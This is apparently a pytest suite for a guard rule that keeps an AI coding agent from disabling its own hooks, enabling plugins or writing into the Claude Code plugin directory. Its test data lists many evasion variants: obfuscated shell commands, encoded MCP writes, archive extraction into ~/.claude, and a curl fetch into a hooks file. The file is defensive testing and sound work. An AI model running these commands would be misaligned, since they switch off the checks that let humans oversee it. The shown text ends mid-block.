"""Claude Code plugin-system guard.

A plugin's hooks/MCP servers run as Claude Code's own subprocesses, outside
the tool-call loop Aegis gates, and `disableAllHooks` switches every hook
(Aegis included) off. Gated: `disableAllHooks` / `enabledPlugins` /
`extraKnownMarketplaces` added to .claude/settings.local.json (or
managed-settings.json), any write into ~/.claude/plugins/, and the
`claude plugin install|enable|update|marketplace add` / `--plugin-dir` CLI.
"""
import json

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns
from aegis.loader import load_policy
from aegis.rules import rule_claude_plugin_protect

EMPTY = Policy()
RULE = "claude-plugin-protect"
LOCAL = "/r/.claude/settings.local.json"


def _write(path, content, cwd=None):
    if not isinstance(content, str):
        content = json.dumps(content)
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content}, cwd=cwd)


def _edit(path, old, new, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old, "new_string": new}, cwd=cwd)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d is not None and d.action == Action.ASK and d.rule == RULE


@pytest.fixture(autouse=True)
def _no_env_escape(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CLAUDE_PLUGIN", raising=False)
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)


# ---- path recognition --------------------------------------------------------
@pytest.mark.parametrize("p,kind", [
    (".claude/settings.local.json", "settings"),
    ("/home/u/.claude/settings.local.json", "settings"),
    ("C:\\Users\\u\\.claude\\settings.local.json", "settings"),
    ("/r/.claude/./settings.local.json", "settings"),
    ("/r/x/../.claude/settings.local.json", "settings"),
    ("/r/.claude/settings.local.json::$DATA", "settings"),
    ("file:///r/.claude/settings%2Elocal.json", "settings"),
    ("$CLAUDE_CONFIG_DIR/settings.local.json", "settings"),
    ("/etc/claude-code/managed-settings.json", "settings"),
    ("/home/u/.claude/plugins", "tree"),
    ("/home/u/.claude/plugins/known_marketplaces.json", "tree"),
    ("~/.claude/plugins/cache/p/1.0/hooks/hooks.json", "tree"),
    ("~/.claude/plugins/marketplaces/m/plugins/p/scripts/fmt.sh", "tree"),
    ("${CLAUDE_CONFIG_DIR}/plugins/installed_plugins.json", "tree"),
    ("C:\\Users\\u\\.claude\\plugins\\x", "tree"),
    ("/home/u/.claude./plugins/x", "tree"),
])
def test_kind(p, kind):
    assert patterns.claude_plugin_kind(p) == kind


@pytest.mark.parametrize("p", [
    "/r/.claude/settings.json", "/r/.claude/settings.local.json.bak",
    "/r/claude/plugins/x", "/r/.claude-plugin/plugin.json", "/r/src/plugins/x.ts",
    "/r/.claude/agents/x.md", "/r/docs/settings.local.json.md",
])
def test_kind_negative(p):
    assert patterns.claude_plugin_kind(p) == ""


# ---- settings.local.json content ----------------------------------------------
@pytest.mark.parametrize("body", [
    {"disableAllHooks": True},
    {"disableAllHooks": "true"},
    {"disableAllHooks": 1},
    {"enabledPlugins": {"fmt@acme": True}},
    {"enabledPlugins": ["fmt@acme"]},
    {"extraKnownMarketplaces": {"acme": {"source": {"source": "github", "repo": "evil/m"}}}},
    {"model": "x", "permissions": {"allow": []}, "enabledPlugins": {"a@b": True}},
    {"DisableAllHooks": True},
])
def test_settings_write_gated(body):
    assert _ours(evaluate(_write(LOCAL, body), EMPTY))


def test_unicode_escaped_key_gated():
    assert _ours(evaluate(_write(LOCAL, '{"\\u0064isableAllHooks": true}'), EMPTY))


def test_unparseable_naming_key_fails_closed():
    assert _ours(evaluate(_write(LOCAL, '{"disableAllHooks": true,,}'), EMPTY))


@pytest.mark.parametrize("body", [
    {"model": "claude-x"},
    {"permissions": {"allow": ["Bash(ls:*)"]}},
    {"disableAllHooks": False},
    {"enabledPlugins": {"fmt@acme": False}},
    {"enabledPlugins": {}},
    {},
])
def test_settings_write_benign(body):
    assert rule_claude_plugin_protect(_write(LOCAL, body), EMPTY) is None


def test_unparseable_without_key_allowed():
    assert rule_claude_plugin_protect(_write(LOCAL, '{"model": '), EMPTY) is None


def test_edit_replayed_diff(tmp_path):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    f.write_text(json.dumps({"model": "a", "enabledPlugins": {"fmt@acme": True}}, indent=2))
    # unrelated edit beside a human-enabled plugin: allowed
    assert rule_claude_plugin_protect(_edit(str(f), '"model": "a"', '"model": "b"'), EMPTY) is None
    # disabling it: allowed
    assert rule_claude_plugin_protect(_edit(str(f), '"fmt@acme": true', '"fmt@acme": false'), EMPTY) is None
    # adding a second plugin: gated
    d2 = _edit(str(f), '"fmt@acme": true', '"fmt@acme": true, "evil@acme": true')
    assert _ours(evaluate(d2, EMPTY))
    # adding disableAllHooks: gated
    assert _ours(evaluate(_edit(str(f), '"model": "a"', '"model": "a", "disableAllHooks": true'), EMPTY))
    # flipping a disabled plugin back on: gated
    f.write_text(json.dumps({"enabledPlugins": {"fmt@acme": False}}))
    assert _ours(evaluate(_edit(str(f), "false", "true"), EMPTY))


def test_edit_of_missing_file_judges_fragment(tmp_path):
    p = str(tmp_path / ".claude" / "settings.local.json")
    assert rule_claude_plugin_protect(_edit(p, "a", '"model": "b"'), EMPTY) is None
    assert _ours(evaluate(_edit(p, "{", '{"disableAllHooks": true,'), EMPTY))
    assert _ours(evaluate(_edit(p, "{", '{"enabledPlugins": {"x@y": true},'), EMPTY))
    assert rule_claude_plugin_protect(_edit(p, "{", '{"disableAllHooks": false,'), EMPTY) is None


def test_relative_path_with_cwd():
    assert _ours(evaluate(_write("settings.local.json", {"disableAllHooks": True},
                                 cwd="/r/.claude"), EMPTY))


# ---- plugin tree ---------------------------------------------------------------
@pytest.mark.parametrize("p", [
    "/home/u/.claude/plugins/cache/p/1.0/hooks/hooks.json",
    "/home/u/.claude/plugins/marketplaces/m/plugins/p/scripts/run.sh",
    "/home/u/.claude/plugins/known_marketplaces.json",
    "/home/u/.claude/plugins/installed_plugins.json",
    "/home/u/.claude/plugins/cache/p/1.0/commands/x.md",
])
def test_tree_write_gated(p):
    assert _ours(evaluate(_write(p, "anything"), EMPTY))


def test_tree_mcp_write_gated():
    d = evaluate(_mcp({"path": "/home/u/.claude/plugins/cache/p/hooks/hooks.json",
                       "content": "{}"}), EMPTY)
    assert _ours(d)


def test_tree_mcp_read_allowed():
    ev = _mcp({"path": "/home/u/.claude/plugins/known_marketplaces.json"},
              tool="mcp__filesystem__read_file")
    assert rule_claude_plugin_protect(ev, EMPTY) is None


def test_mcp_patch_gated():
    patch = ("*** Begin Patch\n*** Update File: /home/u/.claude/plugins/cache/p/hooks/hooks.json\n"
             "@@\n-{}\n+{\"hooks\":{}}\n*** End Patch\n")
    assert _ours(evaluate(_mcp({"patch": patch}, tool="mcp__x__apply_patch"), EMPTY))


# ---- shell -----------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "echo '{}' > ~/.claude/plugins/cache/p/1.0/hooks/hooks.json",
    "tee ~/.claude/plugins/known_marketplaces.json < x",
    "cp evil.sh ~/.claude/plugins/marketplaces/m/plugins/p/scripts/fmt.sh",
    "sed -i 's/a/b/' ~/.claude/plugins/cache/p/hooks/hooks.json",
    "cp x ~/.cl'aude'/plugins/cache/p/hooks/hooks.json",
    "cp x ~/.claude/plug*/cache/p/hooks/hooks.json",
    "cp x ~/.claude/{plugins,y}/cache/p/hooks/hooks.json",
    "cp x ~/.cl?ude/plugins/c",
    "cd ~/.claude && cp x plugins/cache/p/hooks/hooks.json",
    "cd ~/.claude/plugins && cp x cache/p/hooks/hooks.json",
    "cp x $CLAUDE_CONFIG_DIR/plugins/c",
    "python3 -c \"import json;json.dump({'disable'+'AllHooks':True},open('.claude/settings.local.json','w'))\"",
    "jq '.disableAllHooks=true' .claude/settings.local.json | sponge .claude/settings.local.json",
    "cd .claude && echo '{\"disableAllHooks\":true}' > settings.local.json",
    "echo '{\"disableAllHooks\": true}' > /etc/claude-code/managed-settings.json",
    "bash -c 'echo x > ~/.claude/plugins/cache/p/h.json'",
])
def test_shell_write_gated(cmd):
    # Literal `.claude/...` writes are often already self-protect's DENY;
    # this guard must fire on its own and the pipeline must not allow.
    assert _ours(rule_claude_plugin_protect(_shell(cmd), EMPTY)), cmd
    assert evaluate(_shell(cmd), EMPTY).action != Action.ALLOW, cmd


@pytest.mark.parametrize("cmd", [
    "claude plugin install fmt@acme",
    "claude plugin i fmt@acme",
    "claude plugins install fmt@acme",
    "claude plugin enable fmt@acme",
    "claude plugin update fmt@acme",
    "claude plugin marketplace add evil/marketplace",
    "claude plugin marketplace update",
    "/usr/local/bin/claude plugin install fmt@acme",
    "npx @anthropic-ai/claude-code plugin install fmt@acme",
    "claude --plugin-dir ./evil -p hi",
    "claude -p hi --plugin-dir=./evil",
    "cl'aude' plugin install fmt@acme",
    "claude --debug plugin install x@y",
])
def test_cli_gated(cmd):
    assert _ours(rule_claude_plugin_protect(_shell(cmd), EMPTY)), cmd
    assert evaluate(_shell(cmd), EMPTY).action != Action.ALLOW, cmd


@pytest.mark.parametrize("cmd", [
    "cat ~/.claude/plugins/known_marketplaces.json",
    "ls -la ~/.claude/plugins/cache",
    "grep -r hooks ~/.claude/plugins",
    "cat .claude/settings.local.json",
    "git add .claude/settings.local.json",
    "git diff .claude/settings.local.json",
    "claude plugin list",
    "claude plugin validate .",
    "claude plugin uninstall fmt@acme",
    "claude plugin disable fmt@acme",
    "claude -p 'summarize the repo'",
    "npm install && npm test",
    "echo hello > src/plugins/x.ts",
])
def test_shell_benign(cmd):
    assert rule_claude_plugin_protect(_shell(cmd), EMPTY) is None, cmd


def test_mcp_shell_tool_gated():
    ev = _mcp({"command": "claude plugin install x@y"}, tool="mcp__desktop__run_command")
    assert _ours(evaluate(ev, EMPTY))


# ---- escapes / config ------------------------------------------------------------
def test_override_comment_human_only(monkeypatch):
    cmd = "claude plugin install fmt@acme # aegis-allow"
    assert rule_claude_plugin_protect(_shell(cmd), EMPTY) is None
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert _ours(rule_claude_plugin_protect(_shell(cmd), EMPTY))


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CLAUDE_PLUGIN", "1")
    assert rule_claude_plugin_protect(_write(LOCAL, {"disableAllHooks": True}), EMPTY) is None
    assert rule_claude_plugin_protect(_shell("claude plugin install a@b"), EMPTY) is None


def test_modes(tmp_path):
    ev = _write(LOCAL, {"disableAllHooks": True})
    assert rule_claude_plugin_protect(ev, Policy(claude_plugin={"mode": "off"})) is None
    d = rule_claude_plugin_protect(ev, Policy(claude_plugin={"mode": "deny"}))
    assert d.action == Action.DENY
    assert rule_claude_plugin_protect(ev, Policy(claude_plugin={"mode": "monitor"})) is None


def test_allow_regex_path_and_fullmatch_cmd():
    pol = Policy(claude_plugin={"allow": [r"^/r/\.claude/settings\.local\.json$",
                                          r"claude plugin install fmt@acme"]})
    assert rule_claude_plugin_protect(_write(LOCAL, {"disableAllHooks": True}), pol) is None
    assert rule_claude_plugin_protect(_shell("claude plugin install fmt@acme"), pol) is None
    assert _ours(rule_claude_plugin_protect(
        _shell("claude plugin install fmt@acme; claude plugin install evil@x"), pol))
    pol2 = Policy(claude_plugin={"allow": [r"^/r/allowed/"]})
    assert _ours(rule_claude_plugin_protect(
        _write("/r/allowed/../.claude/settings.local.json", {"disableAllHooks": True}), pol2))


def test_loader_wires_knob(tmp_path):
    (tmp_path / "p.yaml").write_text("claude_plugin:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.claude_plugin == {"mode": "deny"}


def test_self_protect_still_denies_settings_json():
    d = evaluate(_write("/r/.claude/settings.json", {"enabledPlugins": {"a@b": True}}), EMPTY)
    assert d.action == Action.DENY and d.rule == "self-protect"


# ---- QA round 1 regressions ------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "git commit -m 'docs: explain claude plugin install flow'",
    "grep -rn 'claude plugin install' docs/",
    "rg -n 'claude --plugin-dir' README.md",
    "echo claude plugin install x@m",
    "cd /r/.claude-tools && pytest tests/plugins",
    "cd ~/.claudette && make plugins",
    "cd ~/.claude && cd ~/proj && npm run build --prefix plugins",
    "find ~/.claude/plugins -name hooks.json",
    "cat ~/.claude/plugins/installed_plugins.json | jq .",
    "jq .enabledPlugins .claude/settings.local.json",
    "claude --settings '{\"model\":\"x\"}' -p hi",
])
def test_r1_not_gated(cmd):
    assert rule_claude_plugin_protect(_shell(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("cmd", [
    "echo 'claude plugin install x@m' | sh",
    "echo claude plugin install x@m | bash",
    "git commit -m x && claude plugin install a@b",
    "git -c alias.x='!claude plugin install a@b' x",
    "claude --settings '{\"disableAllHooks\":true}' -p hi",
    "claude --settings='{\"enabledPlugins\":{\"x@m\":true}}'",
    "claude --settings ./child.json -p hi",
    "claude --setting-sources project -p hi",
    "find ~/.claude/plugins -name '*.sh' -exec sed -i s/a/b/ {} +",
    "jq . x > ~/.claude/plugins/known_marketplaces.json",
])
def test_r1_gated(cmd):
    assert _ours(rule_claude_plugin_protect(_shell(cmd), EMPTY)), cmd


def test_r1_shell_cwd_in_plugin_tree():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
                    args={"command": "echo '{}' > hooks/hooks.json"},
                    cwd="/home/u/.claude/plugins/cache/p/1")
    assert _ours(rule_claude_plugin_protect(ev, EMPTY))
    ev2 = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
                     args={"command": "cp x plugins/cache/p/h.json"}, cwd="/home/u/.claude")
    assert _ours(rule_claude_plugin_protect(ev2, EMPTY))
    ev3 = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
                     args={"command": "cat hooks/hooks.json"}, cwd="/home/u/.claude/plugins/cache/p/1")
    assert rule_claude_plugin_protect(ev3, EMPTY) is None


def test_r1_agent_rules_deny_not_preempted():
    ev = _write("/home/u/.claude/plugins/cache/p/1/.cursorrules", "x")
    d = evaluate(ev, Policy(agent_rules={"mode": "deny"}))
    assert d.action == Action.DENY and d.rule != RULE


def test_r1_managed_settings_only_real_locations():
    assert patterns.claude_plugin_kind("/r/tests/fixtures/managed-settings.json") == ""
    assert patterns.claude_plugin_kind("/Library/Application Support/ClaudeCode/managed-settings.json") == "settings"
    assert patterns.claude_plugin_kind("C:\\ProgramData\\ClaudeCode\\managed-settings.json") == "settings"


def test_r1_monitor_records(monkeypatch):
    seen = []
    import aegis.rules as R
    monkeypatch.setattr(R, "_record_monitor", lambda ev, would, note="": seen.append((would.rule, note)))
    assert rule_claude_plugin_protect(_write(LOCAL, {"disableAllHooks": True}),
                                      Policy(claude_plugin={"mode": "monitor"})) is None
    assert seen and seen[0][0] == RULE


def test_r1_deny_mode_mcp_write():
    d = rule_claude_plugin_protect(_mcp({"path": "/home/u/.claude/plugins/x.json", "content": "{}"}),
                                   Policy(claude_plugin={"mode": "deny"}))
    assert d.action == Action.DENY


def test_r1_plugin_source_repo_not_gated():
    for p in ("/r/myplugin/hooks/hooks.json", "/r/.claude-plugin/plugin.json",
              "/r/.claude-tools/plugins/x"):
        assert rule_claude_plugin_protect(_write(p, "{}"), EMPTY) is None, p


def test_r1_shell_project_settings_json_still_self_protect():
    d = evaluate(_shell("echo '{\"disableAllHooks\":true}' > .claude/settings.json"), EMPTY)
    assert d.action == Action.DENY and d.rule == "self-protect"


# ---- QA round 1 (bypass review) regressions -----------------------------------
def _sh(cmd, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd}, cwd=cwd)


@pytest.mark.parametrize("cmd,cwd", [
    ("echo '{\"disableAllHooks\": true}' > settings.local.json", "/r/.claude"),
    ("echo x > cache/m/p/1/hooks/hooks.json", "/home/u/.claude/plugins"),
    ("echo x > plugins/cache/p/hooks/hooks.json", "/home/u/.claude"),
])
def test_b1_cwd(cmd, cwd):
    assert evaluate(_sh(cmd, cwd), EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("cmd", [
    "echo '{\"disableAllHooks\":true}' | tee .cl*/settings.local.json",
    "echo '{\"disableAllHooks\":true}' | tee {.claude,/tmp}/settings.local.json",
    "echo '{\"disableAllHooks\":true}' > .{claude,x}/settings.local.json",
    "cd .cl* && echo '{\"disableAllHooks\": true}' > settings.local.json",
    "cp /tmp/evil.json .c[l]aude/settings.local.json",
    "cp /tmp/a ./.c*/s*.local.json",
    "echo '{\"disableAllHooks\":true}' > /etc/claude-code/manag*.json",
    "echo '{\"disableAllHooks\":true}' > /etc/claude-code/managed-settings.js*",
    "claude --model sonnet --fallback-model opus --permission-mode default --verbose --debug plugin install evil@m",
    "claude --model a --b c --d e --f g --verbose plugin marketplace add evil/repo",
    "claude -d -d -d -d -d -d -d plugin install x@m",
    "claude plugin $(echo install) x@m",
    "claude plugin `echo install` x@m",
    "claude plugin ${X:-install} x@m",
    "s=install; claude plugin $s x@m",
    "c=claude; $c plugin install x@m",
    "$(which claude) plugin install x@m",
    "echo install x@m | xargs claude plugin",
    "python3 -c \"import subprocess;subprocess.run(['claude','plugin','install','x@m'])\"",
    "node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js plugin install x@m",
    "unzip -o /tmp/x.zip -d ~/.claude",
    "tar xf /tmp/x.tar -C ~/.claude",
    "rsync -a /tmp/evil/ ~/.claude/",
    "git -C ~/.claude apply /tmp/x.patch",
    "patch -d ~/.claude -p1 < /tmp/x.patch",
    "patch -p1 -d .claude < /tmp/x.patch",
    "find . -name settings.local.json -exec sed -i 's/\"disableAllHooks\": false/\"disableAllHooks\": true/' {} +",
    "find ~ -path '*plugins/cache*' -name hooks.json -exec cp /tmp/evil {} \;",
    "claude plugin --scope project install x@m",
    "claude plugin marketplace --scope user add e/r",
    "claude config set disableAllHooks true",
    "claude config add enabledPlugins x@m",
    "echo '{\"disableAllHooks\":true}' > /etc/claude-code/managed-settings.d/x.json",
])
def test_b_shell_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


@pytest.mark.parametrize("args,tool", [
    ({"path": "/r/.claude/settings.local.json", "content": "eyJkaXNhYmxlQWxsSG9va3MiOiB0cnVlfQ==",
      "encoding": "base64"}, "mcp__fs__write"),
    ({"path": "/r/.claude/settings.local.json", "content": "7b7d", "encoding": "hex"}, "mcp__fs__write"),
    ({"path": "/r/.claude/settings.local.json", "content_base64": "eyJ9"}, "mcp__fs__write"),
    ({"archive": "/tmp/x.zip", "dest": "/root/.claude"}, "mcp__fs__extract"),
])
def test_b_mcp_gated(args, tool):
    assert evaluate(_mcp(args, tool=tool), EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("p", [
    "C:\\r\\CLAUDE~1\\SETTIN~1.JSO", "C:\\r\\CLAUDE~1\\plugins\\x", "C:\\u\\CLAUDE~1\\PLUGIN~1\\x",
])
def test_b_short_names(p):
    assert patterns.claude_plugin_kind(p)
    assert evaluate(_write(p, '{"disableAllHooks": true}'), EMPTY).action != Action.ALLOW


def test_b_curly_quote_fragment():
    assert patterns.claude_plugin_fragment_hit("\u201cdisableAllHooks\u201d: true")


def test_b_inert_uppercase_key_does_not_cancel(tmp_path):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    f.write_text('{"DISABLEALLHOOKS": true, "model": "a"}')
    ev = _edit(str(f), '"model": "a"', '"model": "a", "disableAllHooks": true')
    assert _ours(rule_claude_plugin_protect(ev, EMPTY))


@pytest.mark.parametrize("cmd", [
    "claude -p 'fix the plugin install script'",
    "claude -p \"explain claude plugin install\"",
    "cd ~/.claude && ls",
    "tar xf x.tar -C build",
    "find . -name '*.py' -exec grep -l foo {} +",
])
def test_b_still_allowed(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("s", [
    "cd .claude " * 36000,
    ("cd a/.claude/" + "x" * 290 + " ") * 1287,
    "claude plugin " * 28000,
    "{a,b}" * 50000,
    ".c*/" * 90000,
])
def test_b_perf(s):
    import time
    t = time.time()
    rule_claude_plugin_protect(_sh(s), EMPTY)
    assert time.time() - t < 2.0


# ---- QA round 2 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "find src/plugins -name '*.ts' -exec wc -l {} +",
    "find . -name '*.py' -exec grep -l plugins {} \;",
    "find . -path ./node_modules -prune -o -name '*.json' -exec cat {} \; | grep plugins",
    "git checkout main && ls .claude",
    "unzip -l plugin.zip && ls .claude",
    "patch -p1 < fix.diff; ls .claude",
    "git restore .claude",
    "git checkout -- .claude",
    "tar czf /tmp/b.tgz ~/.claude",
    "rsync -a ~/.claude/ /backup/",
    "gh pr create --title x --body 'run claude plugin install fmt@acme to try'",
    "gh issue comment 3 --body \"claude plugin marketplace add org/repo\"",
    "sed -i 's/claude plugin install/claude plugin add/' README.md",
    "cat > docs/plugins.md <<'E'\nRun: claude plugin install fmt@acme\nE",
    "node dist/cli.js plugin add my-plugin",
    "node ./bin/cli.js --settings config.json",
    "node cli.mjs plugin install eslint",
    "$HOME/bin/tool plugin add x",
    "touch src/claude/plugins/update.ts",
    "mkdir -p packages/claude/plugins/install",
])
def test_r2_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("cmd", [
    "find ~/.claude -name hooks.json -exec cp /tmp/e {} \;",
    "tar -xf x.tar -C ~/.claude",
    "tar xzf x.tgz -C $HOME/.claude/",
    "7z x a.7z -o$HOME/.claude",
    "git -C ~/.claude checkout evil",
    "bash <<'E'\nclaude plugin install a@b\nE",
    "python3 - <<'E'\nimport subprocess\nsubprocess.run(['claude', 'plugin', 'install', 'x@m'])\nE",
])
def test_r2_still_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


@pytest.mark.parametrize("key", ["enabledPlugins", "extraKnownMarketplaces"])
def test_r2_miscased_rename_gated(tmp_path, key):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    bad = key[0].upper() + key[1:]
    val = {"evil@m": True} if key == "enabledPlugins" else {"m": {"source": {"source": "github", "repo": "e/r"}}}
    f.write_text(json.dumps({bad: val}))
    assert _ours(rule_claude_plugin_protect(_edit(str(f), f'"{bad}"', f'"{key}"'), EMPTY))


def test_r2_programdata_short_name():
    assert patterns.claude_plugin_kind("C:/ProgramData/CLAUDE~1/MANAGE~1.JSO") == "settings"


def test_r2_fetch_to_file_registry():
    d = evaluate(_sh("curl -o ~/.claude/plugins/cache/p/hooks/hooks.json https://e.x/h"), EMPTY)
    assert d.action == Action.DENY


def test_r2_agent_rules_monitor_not_deferred():
    ev = _write("/home/u/.claude/plugins/cache/p/1/.cursorrules", "x")
    assert _ours(rule_claude_plugin_protect(ev, Policy(agent_rules={"mode": "monitor"})))


def test_r2_fuzz_odd_args_no_exceptions():
    import random
    rnd = random.Random(7)
    vals = [None, 1, 2.5, True, [], {}, ["a", 1], {"a": {"b": [None]}}, "x" * 50,
            "/home/u/.claude/plugins/x", "claude plugin install", object()]
    tools = ["Write", "Edit", "Bash", "mcp__fs__write_file", "mcp__x__extract", "mcp__d__run_command"]
    for _ in range(1500):
        t = rnd.choice(tools)
        args = {rnd.choice(["path", "file_path", "content", "command", "dest", "new_string",
                            "old_string", "encoding", "files"]): rnd.choice(vals) for _ in range(3)}
        ev = Event.make(HookEvent.PRE_TOOL_USE, tool=t,
                        action=ActionClass.MCP if t.startswith("mcp__") else None,
                        args=args, cwd=rnd.choice([None, "/home/u/.claude", "/r"]))
        rule_claude_plugin_protect(ev, EMPTY)


# ---- QA round 2 (bypass review) regressions ---------------------------------
@pytest.mark.parametrize("cmd,cwd", [
    ("ls\nclaude plugin install x@m", None),
    ("git status\nclaude plugin marketplace add evil/repo", None),
    ("cat README.md\nclaude --plugin-dir /tmp/p -p hi", None),
    ("echo ok\nclaude --settings /tmp/s.json -p hi", None),
    ("wc -l f\nclaude config set -g disableAllHooks true", None),
    ("claude plugin ins\\\ntall x@m", None),
    ("cla\\\nude plugin install x@m", None),
    ("claude plu\\\ngin install x@m", None),
    ("claude plugin marketplace a\\\ndd evil/repo", None),
    ("claude --plugin-\\\ndir /tmp/p", None),
    ("claude --sett\\\nings /tmp/s.json", None),
    ("bash -c 'claude plugin ins\\\ntall x@m'", None),
    ("sh <<'E'\ncl\\\naude plugin install x@m\nE", None),
    ("cd ~/.claude; echo x >plugins/x", None),
    ("cd ~/.claude; echo x>>plugins/x", None),
    ("cd .claude; echo '{\"disableAllHooks\":true}' >settings.local.json", None),
    ("echo x >plugins/cache/p/hooks/hooks.json", "/root/.claude"),
    ("echo '{\"disableAllHooks\":1}' >settings.local.json", "/r/.claude"),
    ("cd ~/.claude; cp /tmp/h -tplugins", None),
    ("cd ~/.claude; cp /tmp/h plugin?/x", None),
    ("cd ~/.claude; cp /tmp/h plu*/cache/p/hooks/hooks.json", None),
    ("c=claude; command $c plugin install x@m", None),
    ("c=claude; env $c plugin install x@m", None),
    ("printf 'cl\\x61ude plugin install x@m' | sh", None),
    ("printf 'claude\\x20plugin\\x20install x@m' | sh", None),
    ("echo -e 'claude plugin \\x69nstall x@m' | sh", None),
    ("printf 'claude plugin %s x@m' install | sh", None),
    ("~/.local/share/claude/versions/2.0.1 plugin install x@m", None),
    ("claude plugin ins* x@m", None),
    ("claude ${p:-plugin} install x@m", None),
    ("CLAUDE_CONFIG_DIR=/tmp/evil claude -p hi", None),
])
def test_b2_shell_gated(cmd, cwd):
    assert evaluate(_sh(cmd, cwd), EMPTY).action != Action.ALLOW, cmd


def test_b2_mcp_shell_newline():
    ev = _mcp({"cmd": "ls\nclaude plugin install x@m"}, tool="mcp__x__run_command")
    assert evaluate(ev, EMPTY).action != Action.ALLOW


def test_b2_mcp_append_split_key(tmp_path):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    f.write_text('{"model": "x", "disable')
    for tool, extra in (("mcp__fs__append_file", {}), ("mcp__fs__write_file", {"mode": "append"})):
        ev = _mcp({"path": str(f), "content": 'AllHooks": true}', **extra}, tool=tool)
        assert evaluate(ev, EMPTY).action != Action.ALLOW, tool


def test_b2_oversized_file_edit_fails_closed(tmp_path):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    f.write_text('{"disableAllHook_s": true, "pad": "' + " " * (9 * 1024 * 1024) + '"}')
    assert _ours(rule_claude_plugin_protect(_edit(str(f), 'Hook_s"', 'Hooks"'), EMPTY))


def test_b2_crlf_replay(tmp_path):
    d = tmp_path / ".claude"
    d.mkdir()
    f = d / "settings.local.json"
    f.write_bytes(b'{\r\n  "disableAllHooks_X": true,\r\n  "model": "x"\r\n}')
    ev = _edit(str(f), 'Hooks_X": true,\n  "model"', 'Hooks": true,\n  "model"')
    assert _ours(rule_claude_plugin_protect(ev, EMPTY))


@pytest.mark.parametrize("args", [
    {"path": "/r/.claude/settings.local.json", "data": {"disableAllHooks": True}},
    {"path": "/r/.claude/settings.local.json", "value": {"enabledPlugins": {"x@m": True}}},
    {"path": "/r/.claude/settings.local.json", "json": {"extraKnownMarketplaces": {"m": {}}}},
    {"dir": "/root/.claude", "name": "plugins/cache/p/hooks/hooks.json", "content": "{}"},
    {"dir": "/root/.claude", "path": "plugins/x.json", "content": "{}"},
])
def test_b2_mcp_shapes(args):
    assert evaluate(_mcp(args, tool="mcp__fs__write_json"), EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("p", [
    "C:\\Program Files\\ClaudeCode\\managed-settings.json",
    "$CLAUDE_CONFIG_DIR/settings.json",
])
def test_b2_more_settings_paths(p):
    assert evaluate(_write(p, {"disableAllHooks": True}), EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("cmd", [
    "tree ~/.claude/plugins",
    "printf '%s\\n' hello | sh",
    "echo 'npm test' | sh",
])
def test_b2_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


# ---- QA round 3 (design review) regressions ---------------------------------
@pytest.mark.parametrize("cmd", [
    "git add . && git commit -m \"Add claude plugin install docs\"",
    "git add . && git commit -m \"Add claude --plugin-dir docs\"",
    "grep -rn \"claude plugin\" . --include=*.md",
    "rg \"claude plugins\" . -g '*.md'",
    "docker build -t app . && git commit -m \"feat: Claude plugins page\"",
    "find . -name '*.md' && git commit -m \"docs: claude plugins\"",
    "source .venv/bin/activate && git commit -m \"claude: fix plugins loader\"",
    "eval \"$(direnv export bash)\" && git commit -m \"docs: claude --plugin-dir usage\"",
    "git ls-files | xargs grep -l \"claude plugin\"",
    "grep -rl \"claude plugin install\" docs | xargs sed -i 's/claude plugin install/claude plugin add/'",
    "cat <(git diff) | claude -p \"review the plugins refactor\"",
    "diff <(cat a) <(cat b) # claude plugins",
    "find ~/.claude/plugins -name hooks.json -exec cat {} \;",
    "cd ~/.claude && git status",
])
def test_r3_not_gated(cmd):
    assert rule_claude_plugin_protect(_sh(cmd), EMPTY) is None, cmd


@pytest.mark.parametrize("cmd", [
    "printf '%s ' claude plugin install x | sh",
    "printf 'claude\\x20plugin\\x20install x@m' | sh",
    "echo 'claude plugin install a@b' | bash",
    "eval 'claude plugin install a@b'",
    "git -C ~/.claude pull",
    "cd ~/.claude && git pull",
    "find ~/.claude/plugins -name hooks.json -exec sed -i s/a/b/ {} \;",
])
def test_r3_gated(cmd):
    assert evaluate(_sh(cmd), EMPTY).action != Action.ALLOW, cmd


# ---- QA round 3 (bypass review) regressions ---------------------------------
@pytest.mark.parametrize("cmd,cwd", [
